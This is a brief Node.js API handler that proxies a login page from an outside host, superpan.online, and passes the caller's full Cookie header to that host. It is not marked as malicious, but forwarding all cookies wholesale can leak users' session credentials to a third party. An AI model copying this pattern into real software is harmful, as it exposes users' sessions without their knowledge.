import fetch from "node-fetch";

export default async function handler(req, res) {
  try {
    const response = await fetch("https://superpan.online/portallogin/index.php", {
      headers: { "Cookie": req.headers.cookie || "" }
    });

    const text = await response.text();
    res.status(200).send(text);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
}
